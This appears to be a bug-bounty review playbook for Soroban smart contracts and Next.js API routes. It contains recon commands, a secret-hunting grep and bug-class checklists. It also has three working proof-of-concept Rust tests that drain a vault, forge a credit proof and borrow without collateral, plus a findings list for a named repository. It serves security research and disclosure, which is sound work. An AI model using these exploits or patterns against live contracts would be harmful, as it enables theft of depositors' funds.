# Rust/Soroban + Next.js codebase review

Applies when a source-only program's assets are a repo containing a `contracts/*` Soroban (Rust)
workspace and/or a Next.js `app/api/*` API surface. Companion to `codebase-bounty-review`.

## 0. Recon in 3 commands

```bash
git clone --depth 1 <repo> && cd <repo>
# crate inventory + LOC
for c in contracts/*/; do echo "$c $(rg -c 'require_auth' "$c" 2>/dev/null | awk -F: '{s+=$2}END{print s}')"; done
# per-route auth-guard matrix
for f in $(find app/api -name 'route.ts' | sort); do \
  echo "$(rg -o 'requireApiAdmin|requireApiUser|requireTradeVaultAdmin|requireAuthenticatedUser|getSessionUser|CRON_SECRET|verifyWebhookSignature|verifySessionToken' "$f" | sort -u | tr '\n' ',') |$f"; done
# secret + sink sweep
rg -n -i -g '!*.lock' -e 'BEGIN [A-Z ]*PRIVATE KEY' -e '(secret|api_?key|private_?key|password)\s*[:=]\s*"[^"]{20,}' .
```

The guard matrix is the highest-yield single command: it surfaces the route whose auth differs from
its siblings before you read a line of logic.

## 1. Runtime PoC for Rust/Soroban contracts

The cheapest real evidence is a `#[test]` in the crate's **own** `src/test.rs`
(each crate has `#[cfg(test)] mod test;`), run with the project toolchain.

```bash
cd contracts
cargo test -p zk-credit-verifier poc_fabricated_proof_grants_platinum_tier   # note: hyphens
cargo test -p auto-compound-vault poc_harvest_drains_vault_principal
cargo test -p lending             poc_loan_request_without_deposited_collateral
```

Pitfalls:
- **Hyphenated package names.** `-p zk_credit_verifier` errors "did not match any packages";
  use `zk-credit-verifier`. The crate *directory* uses underscores, the *package* uses hyphens.
- **First build is slow** (~200 crates, ~4 min). Run in background with notify_on_complete; a
  foreground call hits the 600 s ceiling mid-compile. Subsequent runs are seconds.
- **`env.mock_all_auths()`** in the harness mocks `require_auth`. A passing PoC therefore proves the
  logic (a fabricated argument is accepted), NOT that auth is bypassed. State that scope explicitly.
- **Snapshots** are written under `test_snapshots/`; harmless.
- `rustfmt` may be absent → the editor lint warns on .rs edits; ignore it, it is not a compile error.

PoC templates (drop into the crate's `src/test.rs`, reuse the file's existing helpers):

```rust
// Auto-compound vault: arbitrary caller drains principal via caller-supplied yield_amount.
#[test]
fn poc_harvest_drains_vault_principal() {
    let (env, _admin, asset_token, _lending_id, vault_id, client) = setup_test();
    let alice = Address::generate(&env);
    let attacker = Address::generate(&env);
    mint_tokens(&env, &asset_token, &alice, 1_000_0000000i128);
    client.deposit(&alice, &1_000_0000000i128);
    let token = token::Client::new(&env, &asset_token);
    assert_eq!(token.balance(&vault_id), 1_000_0000000i128);
    let _ = client.harvest(&attacker, &100_000_0000000i128); // claimed yield, never arrived
    assert_eq!(token.balance(&attacker), 1_000_0000000i128); // stolen
    assert_eq!(token.balance(&vault_id), 0);
}

// ZK verifier: no-op proof check grants the top tier from one non-zero byte.
#[test]
fn poc_fabricated_proof_grants_platinum_tier() {
    let (env, admin, client) = setup_test();
    let provider_id = String::from_str(&env, "zkTLS-Bank");
    client.register_provider(&admin, &provider_id, &BytesN::from_array(&env, &[1u8; 32]));
    let mut fake = [0u8; 64]; fake[0] = 0x01;
    let record = client.verify_credit_proof(&Address::generate(&env), &ZkProofPayload {
        nullifier: BytesN::from_array(&env, &[0xABu8; 32]),
        proof_bytes: BytesN::from_array(&env, &fake),
        min_score_threshold: 9_999, target_tier: 4,
        provider_id, expiration: env.ledger().timestamp() + 10_000,
    });
    assert_eq!(record.tier_granted, 4);
}

// Lending: loan request gate uses the caller-passed collateral_entries, not stored collateral.
#[test]
fn poc_loan_request_without_deposited_collateral() {
    let (env, contract_id, _admin, borrower, collateral_asset) = setup();
    let client = LendingContractClient::new(&env, &contract_id);
    assert_eq!(client.get_user_collateral_entries(&borrower).len(), 0);
    let loan_id = client.create_loan_request(&borrower, &LoanRequestInput {
        amount: 1_000_0000000, duration_days: 30, interest_rate_bps: 1000,
        max_loan_amount: 100_000_0000000,
        collateral_entries: vec![&env, CollateralEntry { asset: collateral_asset, amount: 100_000_0000000 }],
        rate_model: InterestRateModel::Fixed, reputation_tier: 0,
    });
    assert_eq!(loan_id, 1); // exists with zero deposited collateral
}
```

Capture the terminal output to an evidence file (`evidence/*.txt`) and cite
`tests=N failures=0`. Ship a second copy of the test for the maintainer (it already lives in their
tree) plus the exact `cargo test` command.

## 2. Soroban contract bug-class checklist (what paid)

1. **Missing admin guard.** `caller.require_auth()` with no `assert_admin`/`assert_multisig_admin`.
   Contrast the sibling functions in the *same* contract that DO `assert_admin` — that contrast is what
   defeats "by design" (e.g. `treasury::set_destinations` guards, `treasury::distribute` doesn't).
2. **Caller-supplied data used for an invariant.** Read the *arguments* of any check that gates funds:
   - `create_loan_request` computing borrowing power from `request.collateral_entries` instead of
     `get_user_collateral_entries` (proved by runtime PoC).
   - `harvest(yield_amount)` paying a fee out of the contract's own balance from a caller-chosen number.
   - `place_bid(bid_amount)` recording a settlement without collecting the bid.
   The tell: a `get_*_from_entries(&env, &arg)` call where the sibling code path calls
   `get_*_from_entries(&env, &stored_entries)`.
3. **No-op verification.** Comment says "Cryptographic proof/signature validation"; body loops bytes
   checking `!= 0`; the registered provider key is bound to `_pubkey_hash` and never used. Grep for
   `_`-prefixed bindings near `verify`/`proof`/`signature`.
4. **Unpinned cross-contract caller.** Payout fns invoked by another contract must verify
   `caller == expected_contract` (e.g. `if caller != lending { return 0 }`). Flag money fns that
   transfer from the contract balance without that pin.
5. **Fail-open env guards.** `if (secret) { ... }` patterns; and token bookkeeping that records a
   deposit without enforcing the transfer (`deposit_collateral` "the transfer is handled before this call").

## 3. Next.js API white-box checklist

- **Guard-matrix odd-one-out** (see §0). `requireApiAdmin` = allowlist + DB role; `requireAuthenticatedUser`
  = any role; a route using the weaker one where it needs admin is a priv-esc candidate.
- **Conditional webhook auth.** `if (sigHeader) {verify} else if (!isTestnet) reject` → with a testnet
  passphrase the missing header skips verification. Trace what the handler then writes (position/liquidity).
- **HMAC fail-open.** `if (!webhookSecret) return true;` → unsigned body accepted, state elevated.
- **Unauthenticated server-signing routes.** A POST handler with no session check that does
  `Keypair.fromSecret(process.env.ADMIN_SECRET_KEY)` on client-supplied XDR. Check whether that key is
  also the on-chain admin; if so the blast radius is the contract, not just a fee reserve.
  Note honestly when the write path is browser-only (`"use client"` signer) and therefore throws in Node.
- **Rate limit.** Client-controllable IP headers (`x-real-ip`, `x-forwarded-for`) + fail-open when the
  shared store is down + per-instance in-memory fallback in serverless = bypassable.
- **Info endpoints.** `/api/metrics`, `/api/treasury` GET, health endpoints served unauthenticated.

## 4. Worked example — trustlend-stellar (rev f127a3e)

Single squashed commit (no history to mine). 19 Soroban crates + 41 API routes.
Findings (1 root cause = 1): **Critical** `auto_compound_vault::harvest` drains depositor principal
(PoC PASS); **High** `lending::create_loan_request` trusts caller collateral (PoC PASS);
**High** `zk_credit_verifier::verify_credit_proof` is a no-op (PoC PASS);
**High** SEP-31 webhook auth skipped on testnet; **Medium** `/api/sponsor` unauth fee-bump with the
admin key, `/api/treasury` POST unauth, `treasury::{distribute,collect_protocol_fees}` missing admin
guard, `lending::collect_fees` missing admin guard, 5 cron routes fail open without `CRON_SECRET`,
KYC webhook HMAC fail-open; **Low** rate-limit IP spoof + `/api/metrics` unauth.

The high-value pattern across the whole repo: the codebase is otherwise disciplined (reward/loyalty
fns pin the caller, every `set_*` asserts admin, arithmetic is `checked_*`), so the bugs are
**isolated defects** — one path each that skips a control every sibling enforces. Proving the contrast
is what makes them land.
